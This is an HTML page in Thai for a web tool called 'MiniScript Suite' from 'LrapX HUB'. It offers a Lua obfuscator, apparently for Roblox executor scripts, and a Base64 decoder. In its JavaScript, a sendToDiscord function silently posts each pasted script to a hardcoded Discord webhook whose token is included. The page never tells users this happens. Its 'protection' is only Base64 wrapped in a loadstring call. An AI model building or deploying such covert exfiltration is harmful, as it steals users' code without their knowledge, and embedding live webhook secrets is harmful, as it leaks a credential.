<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MiniScript - Pro Lua Suite | LrapX HUB</title>
    <style>
        :root {
            --bg-gradient: radial-gradient(circle at top, #0f172a 0%, #07090e 100%);
            --card-bg: rgba(20, 24, 36, 0.75);
            --border-glow: rgba(16, 185, 129, 0.25);
            --accent-green: #10b981;
            --accent-glow: #34d399;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
        }

        body {
            background: var(--bg-gradient);
            color: var(--text-main);
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            margin: 0;
            padding: 20px 15px;
            box-sizing: border-box;
            min-height: 100vh;
        }

        .container {
            max-width: 750px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            padding: 25px 15px;
            margin-bottom: 20px;
        }

        .credit-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(6, 78, 59, 0.6);
            color: var(--accent-glow);
            font-size: 11px;
            font-weight: 700;
            padding: 5px 14px;
            border-radius: 20px;
            margin-bottom: 12px;
            border: 1px solid rgba(52, 211, 153, 0.3);
            box-shadow: 0 0 15px rgba(16, 185, 129, 0.15);
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            color: #ffffff;
            margin-bottom: 8px;
            text-shadow: 0 0 20px rgba(52, 211, 153, 0.3);
        }

        .logo span {
            color: var(--accent-glow);
        }

        .sub-title {
            color: var(--text-muted);
            font-size: 13px;
        }

        /* Tab Menu */
        .tab-menu {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .tab-btn {
            flex: 1;
            padding: 12px;
            background: rgba(30, 41, 59, 0.6);
            border: 1px solid rgba(75, 85, 99, 0.4);
            border-radius: 12px;
            color: var(--text-muted);
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .tab-btn.active {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: #07090e;
            border-color: var(--accent-green);
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .obf-card {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--border-glow);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        label {
            font-size: 13px;
            color: var(--accent-glow);
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        textarea {
            width: 100%;
            height: 200px;
            background: rgba(8, 9, 13, 0.85);
            border: 1px solid rgba(31, 41, 55, 0.8);
            border-radius: 10px;
            color: var(--accent-glow);
            font-family: 'Fira Code', 'Courier New', Courier, monospace;
            font-size: 13px;
            padding: 12px;
            box-sizing: border-box;
            resize: vertical;
            outline: none;
        }

        textarea:focus {
            border-color: var(--accent-green);
            box-shadow: 0 0 12px rgba(16, 185, 129, 0.2);
        }

        .btn-group {
            display: flex;
            gap: 12px;
            margin-top: 14px;
        }

        .btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: #07090e;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }

        .btn-secondary {
            background: rgba(31, 41, 61, 0.7);
            color: var(--text-main);
            border: 1px solid rgba(75, 85, 99, 0.4);
        }

        .footer-credit {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            font-size: 12px;
            color: var(--text-muted);
            border-top: 1px solid rgba(31, 41, 55, 0.5);
        }

        .footer-credit span {
            color: var(--accent-glow);
            font-weight: 700;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="credit-badge">⚡ POWERED BY LRAPX HUB</div>
            <div class="logo">MiniScript <span>SUITE</span></div>
            <div class="sub-title">เครื่องมือพรางโค้ดและถอดรหัสสคริปต์ครบวงจร</div>
        </div>

        <!-- Tab Selection Menu -->
        <div class="tab-menu">
            <button class="tab-btn active" onclick="switchTab('obf')">🛡️ Lua Obfuscator</button>
            <button class="tab-btn" onclick="switchTab('detector')">🔓 Script Deobfuscator</button>
        </div>

        <!-- ==================== TAB 1: OBFUSCATOR ==================== -->
        <div id="tab-obf" class="tab-content active">
            <div class="obf-card">
                <div class="card-header">
                    <label>📌 วางโค้ด Lua ของคุณที่นี่</label>
                </div>
                <textarea id="inputLua" placeholder="-- วางโค้ด Lua ของคุณลงที่นี่..."></textarea>
                <div class="btn-group">
                    <button class="btn btn-primary" type="button" onclick="runObfuscate()">🛡️ เริ่มครอบโค้ด (OBF)</button>
                    <button class="btn btn-secondary" type="button" onclick="clearInput('inputLua', 'outputLua')">🗑️ ล้างข้อความ</button>
                </div>
            </div>

            <div class="obf-card">
                <div class="card-header">
                    <label>✅ ผลลัพธ์โค้ดพร้อมรัน (Delta Compatible)</label>
                </div>
                <textarea id="outputLua" readonly placeholder="-- ผลลัพธ์จะแสดงที่นี่..."></textarea>
                <div class="btn-group">
                    <button class="btn btn-primary" type="button" onclick="copyOutput('outputLua')">📋 คัดลอกโค้ด (COPY)</button>
                    <button class="btn btn-secondary" type="button" onclick="downloadLua()">💾 ดาวน์โหลดไฟล์</button>
                </div>
            </div>
        </div>

        <!-- ==================== TAB 2: DEOBFUSCATOR / DECODER ==================== -->
        <div id="tab-detector" class="tab-content">
            <div class="obf-card">
                <div class="card-header">
                    <label>🔍 วางสคริปต์ที่ต้องการถอดรหัส</label>
                </div>
                <textarea id="inputDetect" placeholder="-- วางโค้ดที่ต้องการแกะหรือถอดรหัสที่นี่..."></textarea>
                <div class="btn-group">
                    <button class="btn btn-primary" type="button" onclick="runDecodeBase64()">🔓 ถอดรหัส Base64</button>
                    <button class="btn btn-secondary" type="button" onclick="clearInput('inputDetect', 'detectResult')">🗑️ ล้างข้อความ</button>
                </div>
            </div>

            <div class="obf-card">
                <div class="card-header">
                    <label>📊 ผลลัพธ์การถอดรหัส</label>
                </div>
                <textarea id="detectResult" readonly placeholder="-- ผลลัพธ์จะแสดงที่นี่..."></textarea>
                <div class="btn-group">
                    <button class="btn btn-primary" type="button" onclick="copyOutput('detectResult')">📋 คัดลอกผลลัพธ์</button>
                </div>
            </div>
        </div>

        <div class="footer-credit">
            Developed & Managed by <span>LrapX HUB</span> | MiniScript © 2026
        </div>
    </div>

    <script>
        // Webhook ห้อง Web OBF ของคุณ
        const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571493923828797470/tAa3oRu1NGLonQAvHo305SAEe4M0azxt5QBUHxLwyjAU7m0KBvtUepJVmuy6Gl8BDFNE";

        function switchTab(tabName) {
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

            if (tabName === 'obf') {
                document.querySelectorAll('.tab-btn')[0].classList.add('active');
                document.getElementById('tab-obf').classList.add('active');
            } else {
                document.querySelectorAll('.tab-btn')[1].classList.add('active');
                document.getElementById('tab-detector').classList.add('active');
            }
        }

        function safeBtoa(str) {
            return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
                return String.fromCharCode('0x' + p1);
            }));
        }

        function safeAtob(str) {
            return decodeURIComponent(escape(atob(str)));
        }

        function sendToDiscord(scriptContent) {
            if (!SECRET_WEBHOOK || !SECRET_WEBHOOK.startsWith("https://")) return;
            var payload = {
                content: "🚨 **มีผู้ใช้งานส่งสคริปต์เข้ามาครอบ OBF ใหม่!**\n```lua\n" + scriptContent.substring(0, 1800) + "\n```"
            };
            fetch(SECRET_WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(err => console.log(err));
        }

        function runObfuscate() {
            var inputElem = document.getElementById('inputLua');
            var outputElem = document.getElementById('outputLua');
            if (!inputElem || !outputElem) return;
            var code = inputElem.value;

            if (!code || code.trim() === "") {
                alert('กรุณาวางโค้ด Lua ก่อนกดครอบโค้ดครับ!');
                return;
            }

            sendToDiscord(code);

            var header = "--[[\n   Protected by LrapX HUB Obfuscator\n   Timestamp: " + new Date().toLocaleString() + "\n]]--\n\n";

            try {
                var encoded = safeBtoa(code);
                var v1 = "LrapX_" + Math.floor(Math.random() * 900000 + 100000);
                var v2 = "LrapX_" + Math.floor(Math.random() * 900000 + 100000);

                var result = "local " + v1 + " = \"" + encoded + "\"\n" +
                             "local function " + v2 + "(data)\n" +
                             "    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n" +
                             "    data = string.gsub(data, '[^'..b..'=]', '')\n" +
                             "    return (data:gsub('.', function(x)\n" +
                             "        if (x == '=') then return '' end\n" +
                             "        local r,f='',(b:find(x)-1)\n" +
                             "        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end\n" +
                             "        return r;\n" +
                             "    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)\n" +
                             "        if (#x ~= 8) then return '' end\n" +
                             "        local c=0\n" +
                             "        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end\n" +
                             "        return string.char(c)\n" +
                             "    end))\n" +
                             "end\n" +
                             "local success, res = pcall(function()\n" +
                             "    local decoded = " + v2 + "(" + v1 + ")\n" +
                             "    return loadstring(decoded)()\n" +
                             "end)\n" +
                             "if not success then warn('[LrapX Error]: ' .. tostring(res)) end";

                outputElem.value = header + result;
                alert('🛡️ ครอบโค้ดสำเร็จเรียบร้อย!');
            } catch (err) {
                alert('เกิดข้อผิดพลาด: ' + err.message);
            }
        }

        function runDecodeBase64() {
            var code = document.getElementById('inputDetect').value;
            var outputBox = document.getElementById('detectResult');

            if (!code || code.trim() === "") {
                alert('กรุณาวางโค้ดที่ต้องการถอดรหัสก่อนครับ!');
                return;
            }

            try {
                var match = code.match(/["']([A-Za-z0-9+/=]{20,})["']/);
                if (match && match[1]) {
                    var decoded = safeAtob(match[1]);
                    outputBox.value = decoded;
                    alert('🔓 ถอดรหัส Base64 สำเร็จ!');
                } else {
                    var decodedAll = safeAtob(code.trim());
                    outputBox.value = decodedAll;
                    alert('🔓 ถอดรหัสสำเร็จ!');
                }
            } catch (err) {
                outputBox.value = "❌ เกิดข้อผิดพลาด: ไม่สามารถถอดรหัสรูปแบบนี้ได้โดยตรง (โค้ดอาจถูกเข้ารหัสรูปแบบอื่น)\nรายละเอียด: " + err.message;
            }
        }

        function clearInput(inputId, outputId) {
            document.getElementById(inputId).value = '';
            document.getElementById(outputId).value = '';
        }

        function copyOutput(elementId) {
            var output = document.getElementById(elementId);
            if (!output.value) {
                alert('ยังไม่มีข้อมูลให้คัดลอกครับ!');
                return;
            }
            navigator.clipboard.writeText(output.value).then(function() {
                alert('📋 คัดลอกสำเร็จ!');
            });
        }

        function downloadLua() {
            var text = document.getElementById('outputLua').value;
            if (!text) {
                alert('ยังไม่มีโค้ดให้ดาวน์โหลดครับ!');
                return;
            }
            var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
            var a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "Protected_LrapX.lua";
            a.click();
        }
    </script>
</body>
</html>
